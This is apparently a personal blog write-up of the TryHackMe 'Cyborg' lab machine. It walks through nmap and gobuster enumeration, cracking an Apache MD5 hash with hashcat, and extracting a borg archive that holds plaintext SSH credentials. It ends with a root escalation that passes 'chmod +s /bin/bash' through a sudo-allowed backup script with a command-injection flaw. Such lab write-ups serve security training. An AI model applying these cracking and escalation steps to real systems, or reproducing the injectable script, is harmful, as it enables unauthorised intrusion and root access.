---
title: Cyborg Machine TryHackMe
date: 2022-10-23 00:22:25 +0800
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

# Description

This machine will be pwned using hash decryption, borg software to download files and privilege escalation with bash scripting.

# Enumeration

after a first scan: This is reported to us from the nmap scan:

```ruby
 # Nmap 7.92 scan initiated Sat Oct 22 19:01:56 2022 as: nmap -p22,80 -sCV -oN targeted 10.10.131.6
Nmap scan report for 10.10.131.6
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Sat Oct 22 19:02:18 2022 -- 1 IP address (1 host up) scanned in 21.75 seconds
```
# Exploitation

>So we will have to get into the target machine ussing ssh, since there is no other way.
{: .prompt-tip}

If we go to the page:

```shell
http://MACHINE_IP
```
We get no big deal, so lets run a dirbust scan, from which we get:

```ruby
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.104.12
[+] Method:                  GET
[+] Threads:                 128
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/10/23 22:32:12 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.104.12/admin/]
/etc                  (Status: 301) [Size: 310] [--> http://10.10.104.12/etc/]  
```
Lets head to our new directories:

```shell
http://MACHINE_IP/admin
http://MACHINE_IP/etc
```
At the first link, we can see some interesting stuff, but lets go straight up to the Archive>Download part
![Desktop View](/assets/img/cyborg_download.png){: w="700" h="400"}

If we click on download, we get a file called archive.tar, which we can unzip using:

```shell
tar -xvf archive.tar
```
Now lets head to the /etc directorie inside the web page, from where we get:

```shell
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```
>We will use this credentials to download the music_archive from the unzipped archive.tar
{: .prompt-tip}

First of all, lets try to unhash the password for music_archive. To do this, lets check its type:

```shell
❯ hash-id -f hash.txt
Hash: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
  [+] MD5(APR)
```
Now we know its type, we can unhash it using hashcat:

```shell
hashcat --force -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
From there, we can get the following password:

```shell
squidward
```
Now lets get the music_archive from the borg repository we just downloaded. To do this, cd to it and use the following command:

```shel
borg extract /path/to/repo::music_archive
```
We will be asked a password. Type in the one we got before: squidward 

Now we got a /home folder downloaded into te repository, from were we can extract this from the Documents directory:

```shell
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```
>Now we can use this password for the ssh service: alex@{VICTIM_IP}
{: .prompt-tip}

>If we cat the "user.txt", we can get the user flag
{: .prompt-info}

Its time to escalate some privilege, to do this, we will run this command:

```shell
sudo -l
```
From where we get the following output:

```ruby
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
alex@ubuntu:~$ 
```
As we can see, we can run the backup.sh as alex user without being requiered a password, so lets check it:

```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/so$

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```
From here, there is an interesting line:

```bash
while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done
```
From here we can understand that the command "c" will be executed. It means we can pass it a bash command to become root,so lets do it:

```shell
sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
```
Now we can run "bash -p" command and we will become root

>NOW WE CAN SUBMIT THE ROOT FLAG! CONGRATULATIONS, YOU MAKED IT TILL THE END
{: .prompt-tip}


